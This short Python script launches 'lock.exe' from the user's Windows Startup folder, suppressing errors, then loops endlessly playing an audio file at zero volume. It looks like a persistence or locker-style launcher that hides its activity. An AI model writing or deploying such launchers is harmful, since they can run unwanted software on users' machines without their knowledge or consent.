import os
import pygame

user = os.getlogin()
dir = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\lock.exe"

try:
	os.startfile(dir)
except:
	pass

while True:
	try:
		pygame.mixer.init()
		pygame.mixer.music.set_volume(0)
		pygame.mixer.music.load("welcome.mp3")
		pygame.mixer.music.play()
	except:
		pass
	print("Running...")